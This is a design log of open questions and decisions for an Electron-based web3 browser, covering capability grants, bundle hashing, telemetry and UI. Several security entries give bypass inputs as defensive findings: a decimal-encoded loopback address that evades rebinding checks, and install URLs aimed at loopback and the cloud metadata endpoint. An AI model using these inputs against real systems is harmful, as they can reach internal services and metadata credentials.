# Open questions, contradictions and unknowns

Living document. Entries are resolved into decision records (and then removed, with a link
left behind) or explicitly parked.

Legend: **[OWNER]** product/philosophy/irreversible — never decided by an AI ·
**[AI-REC]** technical, AI proposes · **[RESEARCH]** needs investigation first.

---

## RESOLVED — see the linked record

| Was | Resolution |
|---|---|
| A1 What is the MVP for? | **Owner:** the funding plan in `roadmap.mdx` is **outdated**. MVP target is **100 active users in EU/USA, active = 25 h/month**, to attract A+ contributors, validate the product with real data, and support funding. The MVP must have real-world use |
| A2 Which capability is the thesis? | **Owner:** **A** (run any Web3 program from a URL) is primary; **B** (Web3 Scores) also important; **C** (wallet) simplified and deferred, keep architecture ready; **D** (pluggable domains) a long-term note |
| A3 Is "bitcoind in WASM" in scope? | **Owner:** it is a *future* goal for the execution layer, not an MVP claim → `ADR-0001` (flagship is BitTorrent streaming) |
| A5 Who writes the code? | **Owner:** solo; no Rust, C++ basics; Claude Max; Electron MVP, Chromium fork long-term → `ADR-0002` (TypeScript only, WASM deferred) |
| B1 Four incompatible architectures | → `ADR-0002`. Capability API is the durable asset; broker in Electron main; `orivon-runtime` deferred, not cancelled. Answers the unanswered heading in `technical/orivon-core` |
| B5 Same bytecode, two capability environments | → `ADR-0002`. Two named environments: *frontend* (renderer, ordinary web powers) and *app backend* (broker-side, capability-gated) |
| B6 "Web4 era starter" vs roadmap ordering | Dissolved: the funding plan is outdated. The product creates the movement |
| Telemetry | → `ADR-0004`. **Opt-out** with prominent first-run disclosure, self-hosted, inspectable, minimal payload. (Owner reversed an earlier opt-in decision for measurement efficiency; reversal recorded in the ADR) |
| Local vs remote app data | → `ADR-0003`. Local-first, per-origin isolation, no Orivon server for app data |
| Bundling apps vs URL delivery | → `ADR-0005`. Apps are URL-addressed and cached; flagship pre-cached, not bundled |
| A4b Site-level Trustlessity blocked on resolution | **Owner caught this.** DDOC anchors in DNS, forgeable on ICANN domains without DNSSEC → site L2 and DDOC leave the MVP; trustless resolution (D) is a **prerequisite** for them, which reorders the public roadmap. Everything else in the spectrum turned out to be automatic → `ADR-0006` |
| A4a Advertising priced by trustlessity level | **Owner decision, accepted.** Ad priority and price are keyed to trustlessity level as in `economical-strategy.md`: lower level ⇒ higher price and lower priority, as a deliberate penalty on centralised entrants. See "Accepted tradeoffs" below |
| Trust indicator scope | → `ADR-0006`. Full spectrum from observed behaviour + delivery provenance; ships the attestation hook, not a judge |
| Flagship first-run grants | **Owner (validation pass):** the real grant prompt appears in the clip — the flagship holds zero silent privileges, and the prompt showcases the permission system on camera |
| App-update re-consent friction | **Owner (validation pass):** publisher-key TOFU → `ADR-0005`. **Superseded the same day by the audit** — signing was unspecified and unscheduled, and the amendment's central claim was false (a keyless compromised host serves a 302). Now: hash-pinning + pattern-subset check + version floor |
| Telemetry EU posture | **Owner (validation pass):** first-run explicit choice, [Keep on]/[Turn off], no preselected default → `ADR-0004` amended. ~85–90% retention, defensible as consent under GDPR |
| Video format in v0 | **Owner (audit):** MP4/H.264 only; state it in-product, shoot the clip on an MP4 torrent. MSE cannot demux Matroska and neither can Chromium's `<video>`, so MKV has no path without a remuxer — post-launch (`libav-wasm`) |
| Trust indicator, given two independent breaks | **Owner (audit):** **fix it properly (~2 days)** rather than reduce or cut → `ADR-0006` amendment. Partition CSP so the manifest genuinely bounds network reach, persisted per-origin summaries, byte-asymmetry signal, evidence-first UI |
| Signed/unsigned trust tier | **Owner (audit):** **cut from v0.** Capability-identical in v0, mechanism specified nowhere, and it would have put a red UNSIGNED badge on the flagship in the clip → `ADR-0002` §4 amendment, `ADR-0005` evening amendment |
| What the metric counts | **Owner (audit):** split `activeSec` from `backgroundSec`, state the metric on `activeSec` → `ADR-0004`. A seeding tab previously satisfied 25 h/month on its own, making the daily-use hypothesis unfalsifiable in its own favour |
| Install-count arithmetic | **Corrected, owner-side.** The "115–130 installs" figure applied only the telemetry consent rate — no retention, no activation. Honest requirement is in the **thousands of downloads**. Funnel sizing and channel selection are explicitly **outside the technical work session** |
| C0 Renderer-side webtorrent (the week-0 spike) | **Resolved 2026-08-25 — architecture PASS.** Gates 0/1a/1b/2 pass with hard evidence; gate 4 (throughput) beats the actual product requirement 10x despite failing its literal relative-to-native-control threshold; gate 3 (video playback) is blocked on an unresolved Playwright/`_electron` tooling issue, not a product failure. Full verdict: `planning/spike-verdict.md`. `utilityProcess` fallback was not needed |
| A6 Go / no-go on `readiness.md` | **Owner: GO**, 2026-08-25, conditional on reviewing the spike's execution plan first → `planning/week-0-spike-plan.md` |
| A11 How a cached bundle is served at its origin | **Owner (2026-08-25):** keep the app's real origin, intercepting inside the app's `session` partition only → `ADR-0007`. Chosen over a custom scheme because changing the origin would fork storage, grants and the derived identity key between the cached and live states, with no export path to recover the lost key |
| A10 Handle contracts | **Resolved 2026-08-26.** Full specification written: `architecture/handle-contracts.md` (the five handle types, the closed error enum, close/half-close semantics, a credit-window backpressure design, the revocation cascade). Direction decision (WHATWG streams, owner, 2026-08-25) recorded as `ADR-0008`, which also rescopes `capability-api.md` design rule 1 to the shim rather than the capability layer. One further owner decision taken while writing it: error detail is real for any address an app was permitted to attempt; `denied` stays uniform across every reason for denial |
| What bytes the bundle hash actually covers | **Resolved 2026-08-26.** `ADR-0005` and `ADR-0006` both made "the bundle hash" load-bearing without ever defining it — the same gap that had already been found and cut once for publisher signing. Full construction (flat, sorted, length-prefixed list hash; manifest included as a leaf; case/Unicode-colliding paths rejected at install) specified in `ADR-0009` and `architecture/bundle-hash.md`, with frozen test vectors from an independent reference implementation |

---

## Owner decisions taken 2026-09-03 (backlog-clearing session)

The owner worked through the standing backlog and decided the five questions below that change
what a person using Orivon sees or reads. **These are recorded here only as an index** — the
authoritative resolution for each stays in that entry's own section further down this file, and
where the two ever disagree, the entry wins. Stated explicitly because `A56` records this table
drifting from its entries once already.

| Was | Owner's decision |
|---|---|
| A46 Loader never checks the install origin's address class | **Loopback allowed only as a user-typed literal.** `127.0.0.1`, `[::1]` and `localhost` are installable ONLY when the URL came from a user action and is a literal — never from a page-supplied hint, never via a hostname that *resolved* to loopback. Every other private/link-local/metadata range is refused outright. Rebinding is structurally impossible against a literal, so this needs no dev flag |
| A36 Grant prompts scheduled in two different build steps | **Split; both documents become true.** The grant ledger and a headless grant-decision interface land in build step 2, so the allow path is testable end to end before any human sees it. The user-facing prompt lands in build step 4, once a real manifest exists to render and A20/A27 are settled |
| A29 `quotaBytes` has no startup reconciliation | **The counter must survive restart, and hitting the limit prompts the user.** When an app fills its declared quota Orivon asks whether to grant more space, rather than failing silently or only notifying. This makes the persisted counter user-visible, so it must be honest across restarts |
| A33 Bookmarks bar always visible | **Hide it until there is a bookmark.** A fresh profile shows no empty strip; it appears on first save. The single content shift is user-caused, which is why it was preferred over always-on |
| A7 DDOC expansion | **Domain Data Ownership *Confirmation*.** Accurate to the mechanism — the owner publishes and confirms their own files, with no authority vouching for them — and it does not oversell the DNS trust root that `C1` already flags as weak on ICANN domains |

**A45 was put to the owner in the same session and answered identically** — the publisher
declares the asset list, no crawl heuristic — but it needs no row above, because `ADR-0011` and
PR #59 had already resolved and implemented it before this session recorded anything. The
owner's answer independently confirms that decision rather than opening new work; the
authoritative record stays at `### A45` below.

**A8 was withdrawn rather than decided, because it is not a decision.** `+Privacy` attaches to
the **top rung of each ladder** in the public `web3-score.md` ("Level 4 + Privacy" for websites,
"Level 3 + Privacy" for connections). The private ladder reads L5 only because it carries one
extra website rung — *"full stack runs entirely locally"* — that the public version dropped.
`ADR-0006` and `B3` already reinstate that rung, and reinstating it moves `+Privacy` to L5 as a
consequence. Nothing further to decide; the action is `B3`'s existing public-docs correction.

### Decided without the owner, same session, and recorded here for visibility

The owner's explicit instruction was that questions with no traceable consequence for a person
using Orivon should not be brought to them at all. Ten backlog entries were re-read against that
test, failed it, and were decided as engineering calls. Any of them is reversible on request.

| Was | Call taken |
|---|---|
| A49 What Rule 8 forbids | Rule 8 means **nothing compiles at install time** — the property that actually protects a contributor running from source on Windows or macOS. Add a guard pinning `electron-builder.yml`'s `npmRebuild: false` so the dormant `node-gyp` cannot be woken silently. The stronger "no native tooling anywhere" reading is rejected: it is already false and would need a permanent exception list |
| A28 `confinePath`'s synchronous `realpath` | Fix it — async `realpath`, async `confinePath`. One origin on a slow filesystem can currently block every open tab, which is T11b by a route the in-flight cap cannot bound. No decision to make; it is simply wrong |
| A26 Three port-range parsers | Consolidate into `src/shared/`, which exists for exactly this and is still empty |
| A39 Two disagreeing `isOrivonError` checks | Unify on the stricter `.name === 'OrivonError'` test, and export `ORIVON_ERROR_CODES` from `errors.ts`. The stricter one is the one that actually means "the broker built this" |
| A55 Hookify rules that never fired | Add a fixture driving each rule through `posttooluse.py` and asserting it fires. A guard nobody can tell is broken is worse than no guard |
| A54 the comment budget baseline (resolved) / `isTestFile` duplicated (open) | Baseline cleared and deleted on `stream/backlog-15-comment-sweep`. `isTestFile` still needs consolidating into `scripts/cli.mjs` |
| A31 / A47 May a branch edit a file it does not own | Yes, when the edit keeps that file in step with a change the branch itself owns, and the PR body names the crossing. Extends the existing `backlog-NN` borrow mechanism to code as well as docs, answering both entries with one rule |
| A21 Grant id stability | Mint a **fresh** `GrantId` per grant event. Tombstones stay harmless forever, and the ledger still calls `HandleTable.grantIssued()` |
| A44 Where secp256k1 signing lives | The private scalar never leaves the broker. `IdentityHandle.signEvent` does the derivation and signing broker-side; `src/nostr/` never calls `derivePrivateScalar()`. This resolves the conflict in favour of `src/nostr/README.md`'s boundary and `capability-api.ts`'s "the seed is never exposed" rule |
| A37 Write direction has no wire protocol | Write it as its own `src/contracts/` PR, taking the sketched `WriteMessage`/`WriteAckMessage` shape as the starting point |

---

## A. Awaiting owner decision

None of these block starting the week-0 spike.

| | Decision | Needed by |
|---|---|---|
| A7 | **RESOLVED 2026-09-03 (owner): *Domain Data Ownership Confirmation***, canonical everywhere. Already the published spelling, so the live docs need no change; *Certification* was rejected because it implies an authority vouching for the data and none exists — which would oversell exactly the DNS trust root `C1` flags as forgeable | Action outstanding: correct the two internal documents (`glossary.md`) |
| A8 | **WITHDRAWN 2026-09-03 — not a decision.** `+Privacy` attaches to the top rung of each ladder, and the private website ladder simply has one more rung than the public one. Reinstating that rung (already decided in `ADR-0006`/`B3`) moves it to L5 by itself | Folded into `B3`'s existing public-docs correction |
| A9 | Three capability-API items. **Defaults now proposed** in `architecture/capability-api.md` — `net.listen` grantable to unsigned apps with a declared port range and no privileged ports · grants keyed on `(origin, capability, pattern set)`, a **subset check** over the pattern set (not a kind comparison), with bundle-hash changes handled by the separate re-consent prompt · `fs.quotaBytes` enforced via a running per-origin counter | **Build proceeds on these unless overruled.** Cheap to change before any third-party app exists |
| A12 | **RESOLVED 2026-09-09 (owner): `orivon.fs` stays byte-oriented, no encoding option at the capability layer.** Confirms the provisional reading already in `src/contracts/capability-api.ts`; text decoding belongs to `orivon-node-shim`. See `planning/unattended-build-queue.md` decision 1 | Phase 1 contracts PR removes the PROVISIONAL markers; see below |
| A14 | **RESOLVED 2026-08-26 (owner):** a trailing DNS dot is stripped, so `https://x.example.` and `https://x.example` are ONE origin. Deliberately deviates from `URL.origin`. Exactly one dot; a host still carrying an empty label is rejected | Implemented in `src/broker/policy/origin.ts` |
| A13 | **RESOLVED 2026-08-27 (owner): Promises**, per design rule 2. Widening a Promise to a plain value later is a smaller break than the reverse. Original question: `capability-api.md` §v0 surface writes them as `=> Manifest` and `=> Grant[]`, but design rule 2 in the same document says *"All entry points return Promises"* | **Build step 2.** Transcribed as Promises; see below |
| A15 | **The four bundle-hash caps are guesses, not decisions** — `MAX_PATH_BYTES` 1024, `MAX_ASSET_BYTES` 16 MiB, `MAX_BUNDLE_BYTES` 64 MiB, `MAX_BUNDLE_ENTRIES` 4096 (`src/broker/policy/bundle-hash.ts`, `architecture/bundle-hash.md` §Caps). They are labelled AI-recommendation in the source, but a cap decides which bundles are *refusable*, so two implementations disagreeing on one disagree about whether an app can exist at all. **2026-09-03:** `src/loader/fetch-bundle.ts` (`stream/loader-02-fetch-cache`) is the first real caller of all four, and they are being carried forward uncalibrated | **Before the app loader ships (build step 4).** Needs one real frontend's shape to calibrate against; guessing again now would not be better than the current guess |
| A16 | **RESOLVED 2026-08-28 (owner):** closing the last tab closes the window (option 2 below) — overrules this entry's own AI-REC, which favoured option 1. No `app.quit()` in `tabs.ts`/`window.ts`; `src/main/index.ts`'s existing `window-all-closed` handler already owns whether the whole process then exits | Implemented in `src/main/tabs.ts` (`TabManager`'s `onEmpty` callback) and `src/main/window.ts`. See below |
| A17 | **RESOLVED 2026-08-27 (owner):** an `identityId` is **opaque and broker-generated** — never a user-typed name, never derived from one. The display name is stored beside the identity, not used to derive it. Found undefined during review of PR #5: it appeared exactly once in the whole repository, as one table cell | Recorded in `ADR-0010`, stated in `capability-api.md`, documented on `DeriveRequest.scope` |
| A18 | **RESOLVED 2026-08-27 (owner): pass the GRANTED pattern list, not the manifest.** Original question: Nothing in the signature carries the grant, so a caller passing a raw manifest silently gets the declared authority | **Build step 2, before the broker calls it.** Narrow the list at the call site, or change the parameter to `readonly Pattern[]`. See below |
| A19 | **IDN hostnames are unhandled in connect patterns.** A Unicode host, its case variants and its punycode A-label are three different strings to the matcher, and an app deriving its host from `new URL(...)` gets the A-label | **Before any non-ASCII app origin exists.** Non-ASCII is now rejected outright rather than silently never matching. See below |
| A20 | **PARTIALLY RESOLVED.** `canonicalAddress` lives in `address.ts`; `connect.ts`, `connect-patterns.ts` and (2026-09-03) `policy/update.ts` all use it. Still open: the grant prompt, which does not exist yet | **Whoever builds the grant prompt.** See below |
| A21 | **Does a re-granted capability reuse its GrantId?** `manifest.ts` says a `Grant` is keyed on (origin, capability, pattern set) but never says whether the `id` is derived from that key or minted fresh per grant event. The handle table now tombstones revoked grant ids, so under the derived reading a permanent tombstone would make re-granting impossible | **Before the grant ledger is written.** `HandleTable.grantIssued()` clears the tombstone, so the table is correct either way; the ledger must call it. See below |
| A22 | **`src/broker/policy/paths.ts` assumes app root directory names are single-case hex.** True today and specified — `security-model.md` T13b makes directory names `sha256(canonical_origin)`, and `ADR-0009` reconfirms the bundle hash does not rename them. The assumption is load-bearing for a case-SENSITIVE comparison and is asserted only in a source comment | **Build step 4 (the app loader)**, which writes the first root directory and is the first chance to get the naming wrong. See below |
| A23 | **A derived origin does not carry whether it may be PERSISTED.** T13c forbids ever writing a grant for a loopback or plain-`http` origin to disk, but `originFromUrl` returns a plain string — `http://127.0.0.1:8080` is shape-identical to `https://x.example`, so every caller must remember to re-parse and check | **Build step 2**, when the code that persists grants exists. Owner decided 2026-08-27 to keep the return type a plain string for now rather than change a durable interface before its consumer exists. See below |
| A24 | **Should a whole-codebase guideline sweep be exempt from the one-stream-per-backlog-branch rule?** `stream/backlog-07-guidelines-cleanup` touches six streams' paths at once, which `parallel-work.md` says should be six branches. AI-REC: carve out repo-wide sweeps explicitly, same shape as the PR blueprint's `type:chore` short form | **Before the next backlog-NN sweep is started.** This PR is a fait accompli either way; what's open is whether the rule gets a carve-out. See below |
| A25 | **The docs' own example of an unparseable version parses.** `capability-api.md` and `update.ts` both cite `"2026-08-26"` as a version that cannot be ordered. It orders fine -- hyphens are legal semver prerelease identifiers | Before anyone relies on the example |
| A26 | **Three port-range parsers now exist**: `connect-patterns.ts`, privately in `update.ts`, and `loader/manifest.ts`. None is legally reusable from the others as written | Rule 3; before a fourth |
| A27 | **RESOLVED 2026-09-03.** `update.ts`'s `hostCovers` no longer treats a leading `*.` as a real suffix wildcard — it agrees with `connect-patterns.ts` that such a host authorises nothing, so a granted-but-inert wildcard pattern now correctly prompts for re-consent when replaced by a real host | — |
| A28 | **`confinePath` takes a synchronous `realpath`, so every confined `fs` call blocks the broker's main thread.** `policy/paths.ts` declares the parameter synchronous; any broker that calls it performs blocking `stat`/`lstat` syscalls inline with otherwise-async `readFile`/`writeFile` | **Trigger re-dated 2026-09-01 (owner's decision).** `orivon.fs` is now wired to a renderer with `confinePath` still synchronous — see below for why that trigger fired a step early. Now needed **before any origin holds a real `fs` grant.** |
| A29 | **`quotaBytes` promises reconciliation against the directory on startup, and nothing implements that half.** `contracts/manifest.ts` documents a running per-origin byte counter that reconciles on startup rather than walking the tree every operation; no storage layer or `BrokerFs` member does the reconciling, so the counter resets on every restart. **RESOLVED 2026-09-03 (owner): the counter must survive restart, and filling the quota prompts the user for more space** rather than failing silently — which makes the persisted number user-visible, so it has to be honest across restarts | **Before packaging (build step 10)**, when a real user's disk is at stake. The prompt itself follows `A36`'s split — ledger-side in build step 2, user-facing box in build step 4. See below |
| A30 | **`CLAUDE.md` states as fact that three `BaseWindow` options are `BrowserWindow`-only; they are not.** `titleBarStyle`, `titleBarOverlay` and `trafficLightPosition` are all declared on `BaseWindowConstructorOptions` in electron 44.0.0's own `.d.ts` — only `ready-to-show` is genuinely `BrowserWindow`-only | **`/revise-claude-md`'s job; this A-number is the durable record if that pass does not run first.** See below |
| A31 | **May a non-`backlog-NN` stream branch edit a `docs`-owned file it must keep in step with its own signature change?** The borrow mechanism in `parallel-work.md`'s ownership map is written for `backlog-NN` branches only, but a signature-changing stream branch has already needed the same thing | **Before the next signature change lands. Not blocking.** See below |
| A32 | **Should the new inert toolbar icons (extensions, sidebar, identity, star, shield, hamburger) ship at all before they do anything?** Added with the chrome restyle to match the reference screenshot exactly. AI-REC: ship disabled with an honest `title` tooltip on each, revisit at that build step's readability check | **Before the chrome-restyle PR opens.** Owner override already covers drawing them; this is only about whether "disabled + honest tooltip" is the right mitigation. See below |
| A33 | **Should the bookmarks bar hide itself when there are no bookmarks?** Chrome shows the bar only on the new-tab page; this shell shows it unconditionally, which is simpler but always spends 28px on an empty row for a fresh profile. **RESOLVED 2026-09-03 (owner): hide it until there is a bookmark.** Chosen over always-on because the one content shift it costs happens on first save — an action the user themselves took — rather than being a permanent empty strip on every fresh profile | **Whoever next touches `src/renderer/bookmarks-view.ts`.** See below |
| A34 | **The tab strip's native-controls inset is a hardcoded approximation, not a measured value.** `env(titlebar-area-*)` and `navigator.windowControlsOverlay` both report empty/`false` for this shell's `BaseWindow` + `WebContentsView` chrome — confirmed by a throwaway probe app, 2026-08-28, contradicting every context7 example, which is `BrowserWindow`-only. The restyle reserves a fixed 138px (Windows/Linux, right) or 78px (macOS, left) instead | **Revisit if Electron ever wires window-controls-overlay geometry through `BaseWindow`, or once real hardware on all three platforms confirms the approximation holds.** See below |
| A35 | **`ResponseEnvelope` carries no `handleId`, though `OrivonError` declares one.** `contracts/errors.ts` specifies `platformCode` and `handleId` as optional fields an error may carry; `contracts/ipc.ts`'s `ResponseEnvelope`'s failure branch forwards `code`/`platformCode`/`message` but not `handleId`. A `'closed'` error naming which handle closed loses that identifier the moment it crosses IPC | **Before a `'closed'` error needs to name its handle over IPC** — not reachable yet (build step 2's control channel wires no method that can throw `'closed'`), but a contracts gap, so its own PR per `parallel-work.md` rule 3. See below |
| A36 | **`build-plan.md` places grant prompts in build step 2; `A20` and `A27` both say build step 4.** `build-plan.md`'s own Sequence section lists "grant prompts" under step 2 ("Capability broker"), but `A20`'s and `A27`'s "Needed by" columns both independently say "before the grant prompt is built (build step 4)" | **RESOLVED 2026-09-03 (owner): split it; neither document is wrong.** The grant ledger and a headless grant-decision interface land in **step 2**, so the allow path is exercised end to end before any human sees it; the user-facing prompt lands in **step 4**, once a real manifest exists to render and `A20`/`A27` are settled. Both documents get corrected to say which half they mean. See below |
| A37 | **The write direction of the byte pump (an app writing bytes out over `TcpSocket.writable`) has no wire message anywhere.** `contracts/ipc.ts` specifies `DataMessage`/`CreditMessage`/`StreamEndMessage` in full for the READ direction only; `handle-contracts.md`'s Backpressure section, `capability-api.md`'s Throughput section and `ADR-0008` all describe the write side only as an outcome ("`write()` resolves only once the broker has accepted the bytes"), never as a protocol | **Before the preload-side byte-pump PR** (readable/writable streams built over the port) **can implement `writable`.** See below |
| A38 | **RESOLVED 2026-09-02.** `security-model.md`'s T11b entry names both a per-origin in-flight cap AND "a token-bucket rate limit on IPC dispatch" as the mitigation. The in-flight cap exists (`handles.ts`) and covers every method that does real I/O, but `app.manifest`/`app.grants` never call `handleTable.run`, so nothing bounded how *often* an origin could call them. Reproduced before the fix: 5,000 concurrent `app.grants` calls from one origin, zero rejected. A shared per-origin token bucket (`src/broker/transport/token-bucket.ts`) now gates all six control methods uniformly, checked before `dispatch()` runs | Implemented in `src/broker/transport/token-bucket.ts` and wired in `src/broker/transport/ipc.ts`'s `handleControlRequest`. **The numbers (capacity 200, refill 100/sec) are AI-recommended, not owner-decided** — see below |
| A45 | **RESOLVED 2026-09-03, `ADR-0011`.** `Manifest` gains `assets: readonly string[]`, publisher-declared alongside `entry` — a manifest field, not a crawl heuristic. See below | — |
| A46 | **The loader never checks the install origin against private/loopback address ranges (T12).** `originFromUrl` validates only scheme and hostname syntax, never address class, and never calls `isPublicUnicast`/`classifyAddress` from `src/broker/policy/address.ts` — which already implements the correct "resolve once, validate every address" discipline for exactly this threat. `http://127.0.0.1:9222/.well-known/orivon.json`, `http://169.254.169.254/` (cloud metadata), or a low-TTL host that DNS-rebinds to either, all pass every check the loader runs today. **RESOLVED 2026-09-03 (owner): loopback is installable only as a user-supplied literal** — `127.0.0.1`, `[::1]` or `localhost`, and only when the URL came from a user action, never from a page-supplied hint and never via a hostname that *resolved* to loopback. Every other private, link-local and metadata range is refused outright | **NOW LIVE, trigger re-dated 2026-09-03** — the entry's own "ships inert" premise expired when `loaderSubsystem` was wired to a real `Loader` and a real Electron `Fetch` (`98c4871`, `stream/loader-05-node-storage`). See below |
| A48 | **Two residual gaps in `fetch-bundle.ts`'s byte/time budget cannot be closed from this file alone, and now carry an explicit contract requirement on the real `Fetch` implementation.** (1) A `Fetch` (or its body stream's `read()`) that ignores its `AbortSignal` leaves the original promise permanently pending with its closures on every timeout — `BUNDLE_TIMEOUT_MS` (added this pass) bounds how many such abandoned attempts one `fetchBundle()` call can accumulate, but cannot force a foreign, non-cooperating promise to release whatever it holds (a socket, a timer). (2) The incremental byte cap can only refuse a chunk after `reader.read()` already returned it fully allocated — the real bound is "one chunk", not "the cap"; a BYOB reader would close this but requires the stream to declare `type: 'bytes'`, which this file's minimal structural `FetchResponse` type does not guarantee | **Before a real `Fetch`/stream implementation is wired in.** It must itself observe `AbortSignal` and promptly abort/release the underlying request, and should bound its own chunk sizes. See below |

---

### A12 — what `orivon.fs` actually takes and returns **[RESOLVED 2026-09-09 — owner decision]**

Found while transcribing `capability-api.md` into `src/contracts/` (2026-08-26). The
document specifies the *fs* entry points by name only. Everything else in the v0 surface has a
full signature; these do not.

**Provisional reading, implemented and marked provisional in the file:** the contract layer is
byte-oriented — `readFile(path) => Promise<Uint8Array>`, `writeFile(path, data: Uint8Array)` —
with no encoding option, because `ADR-0008` puts bytes and streams underneath and Node's shapes
in `orivon-node-shim` one layer up. Encoding handling therefore belongs to the shim, alongside
the file cursor it already owns (`handle-contracts.md` §FileHandle).

**Why it is flagged rather than decided:** this is the `fs` half of the durable interface, and
`ADR-0002` makes that the artefact the whole project is built to outlive. A guess promoted
silently would be exactly the failure `CLAUDE.md` Rule 1 exists to prevent.

> **Owner decision, 2026-09-09.** `orivon.fs` stays byte-oriented — no encoding option at the
> capability layer, confirming the provisional reading above exactly as implemented. Text
> decoding is the shim's job, not the capability's, matching `ADR-0008`'s split. Recorded as
> decision 1 of thirteen in `planning/unattended-build-queue.md`; the Phase 1 contracts PR
> removes the PROVISIONAL markers without changing the shape underneath them.

### A13 — synchronous or async app introspection **[AI-REC]**

A direct contradiction inside `capability-api.md`, found the same way. §Design rules 2 states
that all entry points return Promises because sockets cannot be constructed synchronously
across an IPC boundary. §v0 surface then writes `orivon.app.manifest() // => Manifest` and
`orivon.app.grants() // => Grant[]` without one.

**Both readings are defensible.** Design rule 2 is stated as binding. But
`handle-contracts.md`'s own rule — *anything Node exposes synchronously is resolved before the
acquisition promise settles and handed over already populated* — argues the other way: the
manifest and the grant set are both known before the app's first line runs, so they could be
plain values with no round trip.

**Transcribed as Promises**, because design rule 2 is the more explicit statement and widening
a Promise to a plain value later is a smaller break than the reverse. Cheap to change before any
third-party app exists.

---

### A16 — what closing the last tab should do **[RESOLVED]**

Found while extending `scripts/smoke.mjs` (2026-08-27). Writing a check for "closing the last
tab behaves sanely" required knowing what sane *is*, and nothing in this repository says.

**What happens today.** `TabManager.closeTab()` (`src/main/tabs.ts`) removes the view, finds no
fallback tab, sets `activeTabId: null` and emits. The `BaseWindow` stays open showing an empty
tab strip, a disabled toolbar, and no content. Nothing crashes and nothing leaks — it is simply
a state no other browser leaves you in. It was not chosen; it is what falling through the
existing branch happens to produce.

**The three plausible answers.**

| | Behaviour | Who does this |
|---|---|---|
| 1 | Keep the window, open a fresh new tab | Chrome, Edge |
| 2 | Close the window (and on the last window, quit) | Firefox, Safari, and `src/main/index.ts` already wires `window-all-closed -> app.quit()` |
| 3 | Keep the window empty, as now | nobody |

**Recommendation [AI-REC] at the time this was filed:** option 1. It was the least surprising,
it could not strand a user, and it was a two-line change in `closeTab()`.

**Resolved 2026-08-28, owner decision: option 2 instead.** The AI-REC above is superseded, not
followed — closing the last tab closes the window (and, per `window-all-closed`'s existing
non-darwin branch, quits). Chrome and Edge's option 1 leans on their own tab-restore/session
continuity to make "the window never truly closes" feel safe; this shell has no such feature, so
the same behaviour here would just be a window that never goes away for no visible reason.
Firefox and Safari's option 2 matches the plain reading of "close the last tab" better once that
crutch isn't available.

**Why this was written down before being fixed.** Picking one was a product decision, and the
smoke check asserted the pre-decision outcome — so a silent change would have looked like a
regression. The check was labelled to say so (`CURRENT BEHAVIOUR, pending A16 -- not a spec`)
and has now been rewritten to assert the resolution instead
(`scripts/smoke.mjs`).
---

### A18 -- `checkConnect` checks the declaration, not the grant **[RESOLVED 2026-08-27, owner]**

> **Owner decision: pass the GRANTED pattern list, not the manifest.** The narrowing then has
> nowhere else to happen, so the mistake becomes impossible rather than merely documented --
> the same standard `ConnectAllowed` already holds the output side to. It also makes the
> `udp.send` reuse real, since the function currently reads `net.tcp.connect` by name.
> Implemented on `stream/a18-grant-not-manifest`.

The manifest DECLARES what an app may ask for; the user GRANTS what it actually gets
(`architecture/capability-api.md` A9 SS2), and the two sets differ -- a manifest may declare
`["*:*", "192.168.1.50:5000"]` while the user granted only the first.

`checkConnect(manifest, hostArg, port, resolveFn)` reads `manifest.capabilities.net.tcp.connect`
directly. Nothing in the signature carries the grant, so a broker that passes the manifest it
fetched gets the DECLARED authority, silently. The failure mode is the one this whole subsystem
exists to prevent: an app that declared `*:*` and was granted one host would hold `*:*`.

It is documented at the top of `src/broker/policy/connect.ts` and it is not enforced there.
That is the weaker of the two options the file itself argues for -- `ConnectAllowed` deliberately
makes "dial the literal" structural rather than documented, and the input side should be held to
the same standard.

**AI recommendation:** change the parameter to `readonly Pattern[]` of GRANTED patterns. It forces
the narrowing to happen at the call site, where it has to happen anyway; it deletes the untrusted-
manifest-shape handling, since the caller will have parsed it; and it makes the `udp.send` reuse
real, because `checkConnect` currently reads `net.tcp.connect` by name.

**Not done in `stream/broker-03-connect-check`** because it is a signature change and
`development/testing.md` SS1 specifies the signature. That document has now been corrected for the
`port` parameter this stream added; a parameter change should go the same way -- docs first.

**Needed by:** whoever wires the broker in build step 2. Until then, a caller MUST narrow the
manifest's `connect` list to the granted pattern set before calling.

---

### A19 -- IDN hostnames in connect patterns **[AI-REC]**

`connect.ts` folds ASCII case only, deliberately: `toLowerCase()` applies full Unicode folding, and
U+212A KELVIN SIGN folds to `k`, so a comparison using it is wider than DNS's and can be steered.

The consequence is that a non-ASCII host has three spellings that do not match each other: the
Unicode form a human writes in a manifest, its case variants, and the punycode A-label that
`new URL(...).hostname` returns -- which is what an app actually has in hand. A manifest host
written with a Unicode letter therefore never matches the app that declared it.

This failed CLOSED, so it was never a hole. It was a trap: the author saw an unexplained denial and
there was no log line explaining it. As of `stream/broker-03-connect-check` a non-ASCII host or
pattern is REJECTED outright, with a `bad-host` reason the broker can log -- the same argument the
file already makes for `*.example.com`, that a deliberate reject is found in seconds and a silent
non-match never is.

**AI recommendation:** leave it rejected for the MVP. Making IDN work means normalising both sides
to A-labels, which needs UTS-46 -- a dependency or roughly a hundred hand-written lines in a
directory whose whole point is having neither (`src/broker/policy/README.md`). No MVP journey has a
non-ASCII origin.

**Needed by:** the first app served from a non-ASCII origin. Not before.

---

### A20 -- `address.ts` has no canonicaliser, and `connect.ts` needs one **[AI-REC]**

`classifyAddress` answers *"what range is this address in"*, and is deliberately permissive: it
must understand `0177.0.0.1` and `2130706433` in order to BLOCK them. That is right on the deny
side.

`connect.ts` also needs an IDENTITY answer on the ALLOW side -- *"will everything downstream read
this string as the same address"* -- and the two come apart exactly where it hurts. `net.isIP`
rejects `2130706433`, so `net.connect` treats it as a NAME and looks it up again: the rebinding
window reopened one layer below the check that exists to close it. Verified end to end on
2026-08-27, before the fix: a manifest declaring `2130706433:22` produced
`addresses: ["2130706433"]`, and dialling it performed a fresh DNS lookup and reached 127.0.0.1.

`connect.ts` now carries a local `isCanonicalLiteral` validator. It accepts a strict subset and
never assigns meaning, so it can only narrow what `address.ts` already decided and a disagreement
denies -- which is why it is not the duplicate parser `address.ts`'s own comments argue against.

**AI recommendation:** export `canonicalAddress(addr): string | null` from `address.ts` and delete
the local validator. One parser, no subset to keep in sync, and two other call sites want the same
thing: the grant prompt should render the canonical form rather than whatever the manifest wrote
(`2130706433:22` is `127.0.0.1:22` spelled to be unreadable), and the update subset-check in
`policy/update.ts` compares pattern strings, so two spellings of one address currently read as two
different grants.

**Not done in `stream/broker-03-connect-check`** because `address.ts` belongs to
`stream/broker-02-address` and a cross-stream edit is what `development/parallel-work.md` asks to
be raised rather than made.

